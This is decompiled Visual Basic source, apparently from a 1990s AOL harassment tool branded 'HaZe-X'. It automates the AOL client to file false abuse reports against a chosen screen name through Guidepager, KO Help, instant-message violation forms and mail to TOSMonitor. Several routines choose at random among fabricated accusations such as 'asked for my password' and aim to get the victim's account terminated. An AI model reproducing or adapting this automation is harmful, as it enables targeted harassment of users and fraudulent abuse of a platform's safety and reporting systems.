l0D8E = extfn16E0(l0D66, c022E, 0, 0)
l0D8E = extfn16E0(l0D1A, c022E, 0, 0)
l0D8E = extfn16E0(l0D3A, c022E, 0, 0)
subF38 .2#
l0C74% = extfn1520("AOL Frame25", 0&)
l0C8E = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l0D98 = extfn24E0(l0C8E, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l0D98 <> 0
l0D9C = extfn2518(l0D98, "_AOL_Icon")
l0CF4 = extfn2518(l0D98, "_AOL_Edit")
l0DA0 = extfn1718(l0CF4, c07E6, 0, "40-22620")
l0DA4 = extfn24E0(l0C74%, "Invoke Database Record")
l0DA8 = extfn2518(l0DA4, "_AOL_Button")
l0DAC = extfn24E0(l0DA8, "OK")
subF38 .5#
l0DB0 = extfn1750(l0DA8, c0074, 0, 0&)
l0DB0 = extfn1750(l0DA8, c007C, 0, 0&)
l0DB0 = extfn1750(l0DA8, c0074, 0, 0&)
l0DB0 = extfn1750(l0DA8, c007C, 0, 0&)
subF38 .1#
l0DB4% = extfn24E0(l0C74%, "INVOKE DATABASE RECORD")
l0C94 = extfn1750(l0DB4%, c022E, 0, 0)
subF38 .5#
Do
DoEvents
l0DB6% = extfn24E0(l0C74%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l0DB6% > 0
l0DB8 = extfn24E0(l0C74%, "guidepager for staff members")
l0DBC = fn5D0(l0D92(), l0DB8, "*", "_AOL_Icon", Null)
l0DC0 = l0D92(3)
l0D00 = extfn1750(l0DC0, c0074, 0, 0&)
l0D04 = extfn1750(l0DC0, c007C, 0, 0&)
subF38 .1#
l0C92% = extfn24E0(l0C74%, "GUIDEPAGER FOR STAFF MEMBERS")
l0C94 = extfn1750(l0C92%, c022E, 0, 0)
DoEvents
l0CDC% = extfn1750(l0DC4%, c0074, 0, 0&)
l0CDC% = extfn1750(l0DC4%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l0DC6% = extfn24E0(l0C74%, "Report Password Solicitations")
Loop Until l0DC6% > 0
subF38 .1#
l0C92% = extfn24E0(l0C74%, "GUIDEPAGER FOR STAFF MEMBERS")
l0C94 = extfn1750(l0C92%, c022E, 0, 0)
l0CA0 = extfn2518(l0C74%, "_AOL_edit")
l0CA4 = extfn14E8(l0CA0, c0810)
l0CA8 = extfn14E8(l0CA4, c0810)
l0CAC = extfn14E8(l0CA8, c0810)
l0CB0 = extfn14E8(l0CAC, c0810)
l0CB4 = extfn14E8(l0CB0, c0810)
l0CB8 = extfn14E8(l0CB4, c0810)
l0CBC = extfn14E8(l0CB8, c0810)
l0CC0 = extfn14E8(l0CBC, c0810)
l0CC4 = extfn1718(l0CB8, c07E6, 0, Room)
l0C68$ = Chr(10)
l0CC4 = extfn1718(l0CC0, c07E6, 0, Room + ":" & " " & "" & Text1 & l0C68$ & l0C68$)
l0C82 = extfn16E0(l0CB8, c0218, 13, 0)
subF38 .7#
subFE0
For l0DC8 = 0 To Combo1.ListCount
l0DCC$ = Combo1.List(l0DC8)
If  Room = l0DCC$ Then Exit Sub
 Combo1.AddItem Room
Next
Call sub3208
End Sub

Sub mmm_Click ()
Dim l0DCE As String
Dim l0DD0 As Integer
Dim l0DD2 As Variant
Dim l0DD6 As Variant
Dim l0DDA As Variant
Dim l0DDE As Variant
Dim l0DE2 As Integer
Dim l0DE4 As Variant
Dim l0DE8 As Integer
Dim l0DEA As Variant
Dim l0DEE As Integer
Dim l0DF0 As Variant
Dim l0DF4 As Variant
Dim l0DF8 As Variant
Dim l0DFC As Variant
Dim l0E00 As Variant
Dim l0E04 As Variant
Dim l0E08 As Variant
Dim l0E0C As Variant
Dim l0E10 As Variant
Dim l0E14 As Variant
Dim l0E18 As Variant
Dim l0E1C As Variant
Dim l0E20 As Variant
Dim l0E24 As Integer
Dim l0E26 As Variant
Dim l0E2A As Variant
Dim l0E2E As Variant
Dim l0E32 As Variant
Dim l0E36 As Variant
Dim l0E3A As String
Dim l0E3C As Integer
Dim l0E3E As Variant
Dim l0E42 As Variant
Dim l0E46 As Variant
Dim l0E4A As Variant
Dim l0E4E As Variant
Dim l0E52 As Variant
Dim l0E56 As Variant
Dim l0E5A As Variant
Dim l0E5E As Variant
Dim l0E62 As Variant
Dim l0E66 As Variant
Dim l0E6A As Variant
Dim l0E6E As Variant
Dim l0E72 As Variant
Dim l0E76 As Variant
Dim l0E7A As Variant
Dim l0E7E As Variant
Dim l0E82 As Variant
Dim l0E86 As Variant
Dim l0E8A As Variant
Dim l0E8E As Variant
Dim l0E92 As Variant
Dim l0E96 As Variant
Dim l0E9A As Variant
Dim l0E9E As Variant
Dim l0EA2 As Variant
Dim l0EA6() As Integer
Dim l0EAC As Variant
Dim l0EB0 As Variant
Dim l0EB4 As Variant
Dim l0EB8 As Variant
Dim l0EBC As Variant
Dim l0EC0 As Variant
Dim l0EC4 As Variant
Dim l0EC8 As Variant
Dim l0ECC As Integer
Dim l0ECE As Integer
Dim l0ED0 As Variant
Dim l0ED4 As Variant
Dim l0ED8 As Variant
Dim l0EDC As Variant
Dim l0EE0 As Variant
Dim l0EE4 As Integer
Dim l0EE6 As Integer
Dim l0EE8 As Integer
Dim l0EEA As Variant
Dim l0EEE As String
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Multi Meth. [MA]"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
l0DD0% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0DD2 = extfn24E0(l0DD0%, "Keyword")
Loop Until l0DD2 <> 0
l0DD6 = extfn2518(l0DD2, "_AOL_Edit")
l0DDA = extfn1718(l0DD6, c07E6, 0, "GUIDEPAGER")
l0DDE = extfn16E0(l0DD6, c0218, 13, 0)
Do
DoEvents
l0DE2% = extfn1520("AOL Frame25", 0&)
l0DE4 = extfn24E0(l0DE2%, "I Need Help!")
Loop Until l0DE4 > 0
l0DE8% = extfn2518(l0DE4, "_AOL_ICON")
l0DEA = extfn1750(l0DE8%, c0074, 0, 0)
l0DEA = extfn1750(l0DE8%, c007C, 0, 0)
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "I Need Help!")
l0DF0 = extfn16E0(l0DEE%, c022E, 0, 0)
Do
DoEvents
l0DF4 = extfn24E0(l0DD0%, "Report Password Solicitations")
Loop Until l0DF4 <> 0
l0DDA = extfn16E0(l0DF8, c022E, 0, 0)
l0DFC = extfn2518(l0DD0%, "_AOL_Edit")
l0E00 = extfn14E8(l0DFC, c0810)
l0E04 = extfn14E8(l0E00, c0810)
l0E08 = extfn14E8(l0E04, c0810)
l0E0C = extfn14E8(l0E08, c0810)
l0E10 = extfn14E8(l0E0C, c0810)
l0E14 = extfn14E8(l0E10, c0810)
l0E18 = extfn14E8(l0E14, c0810)
l0E1C = extfn14E8(l0E18, c0810)
l0E20 = extfn1718(l0E14, c07E6, 0, Room)
l0DCE$ = Chr(10)
l0E20 = extfn1718(l0E1C, c07E6, 0, Room + ":" & " " & "" & Text1 & l0DCE$ & l0DCE$)
subF38 .3#
l0DDE = extfn16E0(l0E14, c0218, 13, 0)
subF38 .5#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Guidepager Completed"
subF38 .2#
l0DD0% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0DD2 = extfn24E0(l0DD0%, "Keyword")
Loop Until l0DD2 <> 0
l0DD6 = extfn2518(l0DD2, "_AOL_Edit")
l0DDA = extfn1718(l0DD6, c07E6, 0, "KO HELP")
l0DDE = extfn16E0(l0DD6, c0218, 13, 0)
Do
DoEvents
l0DE2% = extfn1520("AOL Frame25", 0&)
l0DE4 = extfn24E0(l0DE2%, "I Need Help!")
Loop Until l0DE4 > 0
l0DE8% = extfn2518(l0DE4, "_AOL_ICON")
l0DEA = extfn1750(l0DE8%, c0074, 0, 0)
l0DEA = extfn1750(l0DE8%, c007C, 0, 0)
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "I Need Help!")
l0DF0 = extfn16E0(l0DEE%, c022E, 0, 0)
Do
DoEvents
l0E24% = extfn24E0(l0DD0%, "Report Password Solicitations")
Loop Until l0E24% > 0
l0E2A = extfn16E0(l0E26, c022E, 0, 0)
l0DFC = extfn2518(l0DD0%, "_AOL_edit")
l0E00 = extfn14E8(l0DFC, c0810)
l0E04 = extfn14E8(l0E00, c0810)
l0E08 = extfn14E8(l0E04, c0810)
l0E0C = extfn14E8(l0E08, c0810)
l0E10 = extfn14E8(l0E0C, c0810)
l0E14 = extfn14E8(l0E10, c0810)
l0E18 = extfn14E8(l0E14, c0810)
l0E1C = extfn14E8(l0E18, c0810)
l0DF0 = extfn1718(l0E0C, c07E6, 0, Room)
l0DF0 = extfn1718(l0E14, c07E6, 0, Room + ":" & " " & "" & Text1 & Chr(10))
subF38 .3#
l0DDE = extfn16E0(l0E18, c0218, 13, 0)
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • New KO Help Completed"
subF38 .2#
Randomize
For l0E2E = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0E32 = 6
    l0E36 = Int(Rnd * l0E32 + 1)
      If  l0E36 = 1 Then l0E3A$ = "17"
      If  l0E36 = 2 Then l0E3A$ = "2"
      If  l0E36 = 3 Then l0E3A$ = "72"
      If  l0E36 = 4 Then l0E3A$ = "53"
      If  l0E36 = 5 Then l0E3A$ = "45"
      If  l0E36 = 6 Then l0E3A$ = "11"
      If  l0E36 = 7 Then l0E3A$ = "65"
      Next
Call subD08("Keyword...", "&Go To")
l0E3C% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l0E3E = extfn24E0(l0E3C%, "Keyword")
Loop Until l0E3E <> 0
l0E42 = extfn2518(l0E3E, "_AOL_Edit")
l0E46 = extfn1718(l0E42, c07E6, 0, "Guidepager")
l0E4A = extfn16E0(l0E42, c0218, 13, 0)
Do
DoEvents
l0E4E = extfn24E0(l0E3C%, "I Need Help!")
Loop Until l0E4E <> 0
l0E52 = extfn2518(l0E4E, "_AOL_Icon")
l0E56 = extfn13D0(l0E52, 2)
l0E5A = extfn13D0(l0E56, 2)
l0E5E = extfn13D0(l0E5A, 2)
l0E62 = extfn13D0(l0E5E, 2)
l0E66 = extfn1750(l0E5A, c0074, 0, 0&)
l0E6A = extfn1750(l0E5A, c007C, 0, 0&)
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "I Need Help!")
Do
DoEvents
l0E6E = extfn24E0(l0E3C%, "Report A Violation")
Loop Until l0E6E <> 0
l0E72 = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l0DF0 = extfn16E0(l0DEE%, c022E, 0, 0)
l0E76 = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l0E7A = extfn24E0(l0E3C%, "Violations via instant Messages")
Loop Until l0E7A <> 0
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "Report A Violation")
l0DF0 = extfn16E0(l0DEE%, c022E, 0, 0)
l0E42 = extfn2518(l0E7A, "_AOL_Edit")
l0E7E = extfn13D0(l0E42, 2)
l0E82 = extfn13D0(l0E7E, 2)
l0E86 = extfn13D0(l0E82, 2)
l0E8A = extfn13D0(l0E86, 2)
l0E8E = extfn13D0(l0E8A, 2)
l0E92 = extfn13D0(l0E8E, 2)
l0E96 = extfn13D0(l0E92, 2)
l0E9A = extfn13D0(l0E96, 2)
l0E46 = extfn1718(l0E42, c07E6, 0, Date)
l0E46 = extfn1718(l0E82, c07E6, 0, Time)
l0E46 = extfn1718(l0E8A, c07E6, 0, Room + ":" & " " + Text1 & Chr(10))
subF38 .3#
l0E9E = extfn2518(l0E7A, "_AOL_Button")
l0E66 = extfn1750(l0E9E, c0074, 0, 0&)
l0E6A = extfn1750(l0E9E, c007C, 0, 0&)
l0EA2 = extfn16E0(l0E7A, c022E, 0, 0)
l0EA2 = extfn16E0(l0E4E, c022E, 0, 0)
l0EA2 = extfn16E0(l0E6E, c022E, 0, 0)
sub30B0 "•-^v•HaZe-X²·³ [gold] • IM Violation Complete"
subF38 .2#
l0DD0% = extfn1520("AOL Frame25", 0&)
l0DEA = extfn1520("AOL Frame25", 0&)
Call subD08("INVOKE DATABASE RECORD", "*")
Do
DoEvents
l0EAC = extfn24E0(l0DEA, "INVOKE DATABASE RECORD")
DoEvents
Loop Until l0EAC <> 0
l0EB0 = extfn2518(l0EAC, "_AOL_Icon")
l0EB4 = extfn2518(l0EAC, "_AOL_Edit")
l0EB8 = extfn1718(l0EB4, c07E6, 0, "40-22620")
subF38 .3#
l0EBC = extfn24E0(l0DD0%, "Invoke Database Record")
l0EC0 = extfn2518(l0EBC, "_AOL_Button")
l0EC4 = extfn24E0(l0EC0, "OK")
subF38 .5#
l0EC8 = extfn1750(l0EC0, c0074, 0, 0&)
l0EC8 = extfn1750(l0EC0, c007C, 0, 0&)
subF38 .1#
l0ECC% = extfn24E0(l0DD0%, "INVOKE DATABASE RECORD")
l0DF0 = extfn1750(l0ECC%, c022E, 0, 0)
subF38 .9#
Do
DoEvents
l0ECE% = extfn24E0(l0DD0%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l0ECE% > 0
l0ED0 = extfn24E0(l0DD0%, "guidepager for staff members")
l0ED4 = fn5D0(l0EA6(), l0ED0, "*", "_AOL_Icon", Null)
l0ED8 = l0EA6(3)
l0EDC = extfn1750(l0ED8, c0074, 0, 0&)
l0EE0 = extfn1750(l0ED8, c007C, 0, 0&)
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "GUIDEPAGER FOR STAFF MEMBERS")
l0DF0 = extfn1750(l0DEE%, c022E, 0, 0)
DoEvents
l0EE6% = extfn1750(l0EE4%, c0074, 0, 0&)
l0EE6% = extfn1750(l0EE4%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l0EE8% = extfn24E0(l0DD0%, "Report Password Solicitations")
Loop Until l0EE8% > 0
subF38 .1#
l0DEE% = extfn24E0(l0DD0%, "GUIDEPAGER FOR STAFF MEMBERS")
l0DF0 = extfn1750(l0DEE%, c022E, 0, 0)
l0DFC = extfn2518(l0DD0%, "_AOL_edit")
l0E00 = extfn14E8(l0DFC, c0810)
l0E04 = extfn14E8(l0E00, c0810)
l0E08 = extfn14E8(l0E04, c0810)
l0E0C = extfn14E8(l0E08, c0810)
l0E10 = extfn14E8(l0E0C, c0810)
l0E14 = extfn14E8(l0E10, c0810)
l0E18 = extfn14E8(l0E14, c0810)
l0E1C = extfn14E8(l0E18, c0810)
l0E20 = extfn1718(l0E14, c07E6, 0, Room)
l0DCE$ = Chr(10)
l0E20 = extfn1718(l0E1C, c07E6, 0, Room + ":" & " " & "" & Text1 & l0DCE$ & l0DCE$)
subF38 .3#
l0DDE = extfn16E0(l0E14, c0218, 13, 0)
subF38 .7#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Staffpager Completed."
subF38 .2#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Multi Meth. [MA] Completed."
Call sub3208
For l0EEA = 0 To Combo1.ListCount
l0EEE$ = Combo1.List(l0EEA)
If  Room = l0EEE$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub mmr_Click ()
Dim l0EF0 As Variant
Dim l0EF4 As Integer
Dim l0EF6 As Variant
Dim l0EFA As Variant
Dim l0EFE As Variant
Dim l0F02 As Variant
Dim l0F06 As Integer
Dim l0F08 As Variant
Dim l0F0C As Integer
Dim l0F0E As Variant
Dim l0F12 As Integer
Dim l0F14 As Variant
Dim l0F18 As Variant
Dim l0F1C As Variant
Dim l0F20 As Variant
Dim l0F24 As Variant
Dim l0F28 As Variant
Dim l0F2C As Variant
Dim l0F30 As Variant
Dim l0F34 As Variant
Dim l0F38 As Variant
Dim l0F3C As Variant
Dim l0F40 As Variant
Dim l0F44 As Variant
Dim l0F48 As String
Dim l0F4A As Integer
Dim l0F4C As Variant
Dim l0F50 As Variant
Dim l0F54 As Variant
Dim l0F58 As Variant
Dim l0F5C As Variant
Dim l0F60 As String
Dim l0F62 As Integer
Dim l0F64 As Variant
Dim l0F68 As Variant
Dim l0F6C As Variant
Dim l0F70 As Variant
Dim l0F74 As Variant
Dim l0F78 As Variant
Dim l0F7C As Variant
Dim l0F80 As Variant
Dim l0F84 As Variant
Dim l0F88 As Variant
Dim l0F8C As Variant
Dim l0F90 As Variant
Dim l0F94 As Variant
Dim l0F98 As Variant
Dim l0F9C As Variant
Dim l0FA0 As Variant
Dim l0FA4 As Variant
Dim l0FA8 As Variant
Dim l0FAC As Variant
Dim l0FB0 As Variant
Dim l0FB4 As Variant
Dim l0FB8 As Variant
Dim l0FBC As Variant
Dim l0FC0 As Variant
Dim l0FC4 As Variant
Dim l0FC8 As Variant
Dim l0FCC As Variant
Dim l0FD0 As String
If  UCase$(l0EF0) Like "*KaOS*" Or UCase$(l0EF0) Like "*NiPP*" Or UCase$(l0EF0) Like "*CHOP*" Or UCase$(l0EF0) Like "*LoRe*" Or UCase$(l0EF0) Like "*CouNT*" Or UCase$(l0EF0) Like "*SoSo*" Or UCase$(l0EF0) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Multi Meth. [Reg]"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
l0EF4% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0EF6 = extfn24E0(l0EF4%, "Keyword")
Loop Until l0EF6 <> 0
l0EFA = extfn2518(l0EF6, "_AOL_Edit")
l0EFE = extfn1718(l0EFA, c07E6, 0, "GUIDEPAGER")
l0F02 = extfn16E0(l0EFA, c0218, 13, 0)
Do
DoEvents
l0F06% = extfn1520("AOL Frame25", 0&)
l0F08 = extfn24E0(l0F06%, "I Need Help!")
Loop Until l0F08 > 0
l0F0C% = extfn2518(l0F08, "_AOL_ICON")
l0F0E = extfn1750(l0F0C%, c0074, 0, 0)
l0F0E = extfn1750(l0F0C%, c007C, 0, 0)
subF38 .1#
l0F12% = extfn24E0(l0EF4%, "I Need Help!")
l0F14 = extfn16E0(l0F12%, c022E, 0, 0)
Do
DoEvents
l0F18 = extfn24E0(l0EF4%, "Report Password Solicitations")
Loop Until l0F18 <> 0
l0EFE = extfn16E0(l0F1C, c022E, 0, 0)
l0F20 = extfn2518(l0EF4%, "_AOL_Edit")
l0F24 = extfn14E8(l0F20, c0810)
l0F28 = extfn14E8(l0F24, c0810)
l0F2C = extfn14E8(l0F28, c0810)
l0F30 = extfn14E8(l0F2C, c0810)
l0F34 = extfn14E8(l0F30, c0810)
l0F38 = extfn14E8(l0F34, c0810)
l0F3C = extfn14E8(l0F38, c0810)
l0F40 = extfn14E8(l0F3C, c0810)
l0F44 = extfn1718(l0F38, c07E6, 0, Room)
l0F48$ = Chr(10)
l0F44 = extfn1718(l0F40, c07E6, 0, Room + ":" & " " & "" & Text1 & l0F48$ & l0F48$)
subF38 .3#
l0F02 = extfn16E0(l0F38, c0218, 13, 0)
subF38 .5#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Guidepager Completed"
subF38 .2#
l0EF4% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l0EF6 = extfn24E0(l0EF4%, "Keyword")
Loop Until l0EF6 <> 0
l0EFA = extfn2518(l0EF6, "_AOL_Edit")
l0EFE = extfn1718(l0EFA, c07E6, 0, "KO HELP")
l0F02 = extfn16E0(l0EFA, c0218, 13, 0)
Do
DoEvents
l0F06% = extfn1520("AOL Frame25", 0&)
l0F08 = extfn24E0(l0F06%, "I Need Help!")
Loop Until l0F08 > 0
l0F0C% = extfn2518(l0F08, "_AOL_ICON")
l0F0E = extfn1750(l0F0C%, c0074, 0, 0)
l0F0E = extfn1750(l0F0C%, c007C, 0, 0)
subF38 .1#
l0F12% = extfn24E0(l0EF4%, "I Need Help!")
l0F14 = extfn16E0(l0F12%, c022E, 0, 0)
Do
DoEvents
l0F4A% = extfn24E0(l0EF4%, "Report Password Solicitations")
Loop Until l0F4A% > 0
l0F50 = extfn16E0(l0F4C, c022E, 0, 0)
l0F20 = extfn2518(l0EF4%, "_AOL_edit")
l0F24 = extfn14E8(l0F20, c0810)
l0F28 = extfn14E8(l0F24, c0810)
l0F2C = extfn14E8(l0F28, c0810)
l0F30 = extfn14E8(l0F2C, c0810)
l0F34 = extfn14E8(l0F30, c0810)
l0F38 = extfn14E8(l0F34, c0810)
l0F3C = extfn14E8(l0F38, c0810)
l0F40 = extfn14E8(l0F3C, c0810)
l0F14 = extfn1718(l0F30, c07E6, 0, Room)
l0F14 = extfn1718(l0F38, c07E6, 0, Room + ":" & " " & "" & Text1 & Chr(10))
subF38 .3#
l0F02 = extfn16E0(l0F3C, c0218, 13, 0)
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • New KO Help Completed"
subF38 .2#
Randomize
For l0F54 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0F58 = 6
    l0F5C = Int(Rnd * l0F58 + 1)
      If  l0F5C = 1 Then l0F60$ = "17"
      If  l0F5C = 2 Then l0F60$ = "2"
      If  l0F5C = 3 Then l0F60$ = "72"
      If  l0F5C = 4 Then l0F60$ = "53"
      If  l0F5C = 5 Then l0F60$ = "45"
      If  l0F5C = 6 Then l0F60$ = "11"
      If  l0F5C = 7 Then l0F60$ = "65"
      Next
Call subD08("Keyword...", "&Go To")
l0F62% = extfn1520("AOL Frame25", 0&)
Do
DoEvents
l0F64 = extfn24E0(l0F62%, "Keyword")
Loop Until l0F64 <> 0
l0F68 = extfn2518(l0F64, "_AOL_Edit")
l0F6C = extfn1718(l0F68, c07E6, 0, "Guidepager")
l0F70 = extfn16E0(l0F68, c0218, 13, 0)
Do
DoEvents
l0F74 = extfn24E0(l0F62%, "I Need Help!")
Loop Until l0F74 <> 0
l0F78 = extfn2518(l0F74, "_AOL_Icon")
l0F7C = extfn13D0(l0F78, 2)
l0F80 = extfn13D0(l0F7C, 2)
l0F84 = extfn13D0(l0F80, 2)
l0F88 = extfn13D0(l0F84, 2)
l0F8C = extfn1750(l0F80, c0074, 0, 0&)
l0F90 = extfn1750(l0F80, c007C, 0, 0&)
subF38 .1#
l0F12% = extfn24E0(l0EF4%, "I Need Help!")
Do
DoEvents
l0F94 = extfn24E0(l0F62%, "Report A Violation")
Loop Until l0F94 <> 0
l0F98 = extfn2518(10634, "_AOL_Icon")
SendKeys "{tab}" & " "
l0F14 = extfn16E0(l0F12%, c022E, 0, 0)
l0F9C = extfn16E0(10634, c022E, 0, 0)
Do
DoEvents
l0FA0 = extfn24E0(l0F62%, "Violations via instant Messages")
Loop Until l0FA0 <> 0
subF38 .1#
l0F12% = extfn24E0(l0EF4%, "Report A Violation")
l0F14 = extfn16E0(l0F12%, c022E, 0, 0)
l0F68 = extfn2518(l0FA0, "_AOL_Edit")
l0FA4 = extfn13D0(l0F68, 2)
l0FA8 = extfn13D0(l0FA4, 2)
l0FAC = extfn13D0(l0FA8, 2)
l0FB0 = extfn13D0(l0FAC, 2)
l0FB4 = extfn13D0(l0FB0, 2)
l0FB8 = extfn13D0(l0FB4, 2)
l0FBC = extfn13D0(l0FB8, 2)
l0FC0 = extfn13D0(l0FBC, 2)
l0F6C = extfn1718(l0F68, c07E6, 0, Date)
l0F6C = extfn1718(l0FA8, c07E6, 0, Time)
l0F6C = extfn1718(l0FB0, c07E6, 0, Room + ":" & " " + Text1 & Chr(10))
subF38 .3#
l0FC4 = extfn2518(l0FA0, "_AOL_Button")
l0F8C = extfn1750(l0FC4, c0074, 0, 0&)
l0F90 = extfn1750(l0FC4, c007C, 0, 0&)
l0FC8 = extfn16E0(l0FA0, c022E, 0, 0)
l0FC8 = extfn16E0(l0F74, c022E, 0, 0)
l0FC8 = extfn16E0(l0F94, c022E, 0, 0)
sub30B0 "•-^v•HaZe-X²·³ [gold] • IM Violation Complete"
subF38 .2#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Multi Meth. [Reg] Completed."
Call sub3208
For l0FCC = 0 To Combo1.ListCount
l0FD0$ = Combo1.List(l0FCC)
If  Room = l0FD0$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub monitor_Click ()
Dim l0FD2 As Variant
Dim l0FD6 As Variant
Dim l0FDA As Variant
Dim l0FDE As String
Dim l0FE0 As Variant
Dim l0FE4() As Integer
Dim l0FEA As Integer
Dim l0FEC As Variant
Dim l0FF0 As Variant
Dim l0FF4 As String
Dim l0FF6 As Variant
Dim l0FFA As Variant
Dim l0FFE As Variant
Dim l1002 As Variant
Dim l1006 As Variant
Dim l100A As Variant
Dim l100E As Variant
Dim l1012 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0FD2 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0FD6 = 6
    l0FDA = Int(Rnd * l0FD6 + 1)
      If  l0FDA = 1 Then l0FDE$ = "" & Form1.Room & " asked for my password."
      If  l0FDA = 2 Then l0FDE$ = "" & Form1.Room & " tried to hack my password."
      If  l0FDA = 3 Then l0FDE$ = "Read!" & Form1.Room & " asked for my password."
      If  l0FDA = 4 Then l0FDE$ = "Please do something about " & Form1.Room & "."
      If  l0FDA = 5 Then l0FDE$ = "This guy wants my password:" & Form1.Room
      If  l0FDA = 6 Then l0FDE$ = "Please help " & Form1.Room & " wants my password."
      If  l0FDA = 7 Then l0FDE$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0FE0) Like "*KaOS*" Or UCase$(l0FE0) Like "*NiPP*" Or UCase$(l0FE0) Like "*CHOP*" Or UCase$(l0FE0) Like "*LoRe*" Or UCase$(l0FE0) Like "*CouNT*" Or UCase$(l0FE0) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSMonitor"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l0FEA% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l0FEC = extfn24E0(l0FEA%, "Compose Mail")
DoEvents
Loop Until l0FEC <> 0
l0FF0 = fn5D0(l0FE4(), l0FEC, "*", "_AOL_Edit", Null)
subF00 l0FE4(1), "TOSMonitor"
subF00 l0FE4(3), "" & l0FDE$
l0FF4$ = Chr(10) + Chr(3)
subF00 l0FE4(4), "" & Room & ":" & " " & "" & Text1 & l0FF4$ & l0FF4$
l0FF6 = extfn24E0(l0FEC, "Send")
l0FFA = extfn2518(l0FEC, "_AOL_Icon")
l0FFE = extfn13D0(l0FFA, 2)
l1002 = extfn13D0(l0FFE, 2)
l1006 = extfn1750(l0FFA, c0074, 0, 0&)
l100A = extfn1750(l0FFA, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l100E = 0 To Combo1.ListCount
l1012$ = Combo1.List(l100E)
If  Room = l1012$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub names1_Click ()
Dim l1014 As Variant
Dim l1018 As Variant
Dim l101C As Variant
Dim l1020 As String
Dim l1022 As Variant
Dim l1026() As Integer
Dim l102C As Integer
Dim l102E As Variant
Dim l1032 As Variant
Dim l1036 As String
Dim l1038 As Variant
Dim l103C As Variant
Dim l1040 As Variant
Dim l1044 As Variant
Dim l1048 As Variant
Dim l104C As Variant
Dim l1050 As Variant
Dim l1054 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1014 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1018 = 6
    l101C = Int(Rnd * l1018 + 1)
      If  l101C = 1 Then l1020$ = "" & Form1.Room & " asked for my password."
      If  l101C = 2 Then l1020$ = "" & Form1.Room & " tried to hack my password."
      If  l101C = 3 Then l1020$ = "Read!" & Form1.Room & " asked for my password."
      If  l101C = 4 Then l1020$ = "Please do something about " & Form1.Room & "."
      If  l101C = 5 Then l1020$ = "This guy wants my password:" & Form1.Room
      If  l101C = 6 Then l1020$ = "Please help " & Form1.Room & " wants my password."
      If  l101C = 7 Then l1020$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1022) Like "*KaOS*" Or UCase$(l1022) Like "*NiPP*" Or UCase$(l1022) Like "*CHOP*" Or UCase$(l1022) Like "*LoRe*" Or UCase$(l1022) Like "*CouNT*" Or UCase$(l1022) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSNames1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l102C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l102E = extfn24E0(l102C%, "Compose Mail")
DoEvents
Loop Until l102E <> 0
l1032 = fn5D0(l1026(), l102E, "*", "_AOL_Edit", Null)
subF00 l1026(1), "TOSNames1"
